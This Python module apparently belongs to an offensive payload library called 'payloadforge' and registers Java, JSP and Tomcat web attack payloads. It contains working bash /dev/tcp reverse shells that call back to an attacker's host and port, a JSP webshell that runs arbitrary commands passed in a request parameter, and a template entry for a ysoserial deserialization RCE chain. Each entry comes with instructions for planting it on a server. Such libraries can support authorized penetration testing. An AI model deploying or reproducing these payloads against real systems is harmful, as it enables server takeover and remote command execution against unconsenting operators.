"""Java, JSP, and Tomcat payloads."""

from payloadforge.payloads.registry import register

register(
    "java_runtime_exec",
    "web", "java",
    "Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"});",
    "Java Runtime.exec — the classic. Drop into a JSP, deserialization gadget, or exploit.",
    testable=False,
    test_note="Requires a Java execution context (server, deserialization, etc.).",
    tags=["java", "runtime", "reverse"],
)

register(
    "jsp_reverse",
    "web", "jsp",
    "<%@ page import=\"java.util.*,java.io.*\" %><% Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}); %>",
    "Minimal JSP reverse shell. Upload to a webapp-accessible directory.",
    testable=False,
    test_note="Requires upload to a Tomcat/Jetty webapp and execution permissions.",
    tags=["jsp", "tomcat", "reverse"],
)

register(
    "jsp_cmd_shell",
    "web", "jsp",
    "<%@ page import=\"java.util.*,java.io.*\" %><% String c = request.getParameter(\"c\"); if (c != null) { Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c}); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = br.readLine()) != null) out.println(l); } %>",
    "JSP webshell — accepts a command via ?c= and returns output. Interactive, unlike the reverse variant.",
    testable=False,
    test_note="Requires upload to a JSP-enabled web server.",
    tags=["jsp", "webshell"],
)

register(
    "tomcat_memcached_deserialize",
    "web", "java",
    "# Requires ysoserial — generate payload and deliver to vulnerable Tomcat endpoint",
    "Reference template for a deserialization RCE chain against Tomcat. Generate with ysoserial + base64.",
    testable=False,
    test_note="Requires ysoserial; delivery depends on target's gadget chain.",
    tags=["java", "deserialize", "tomcat"],
)
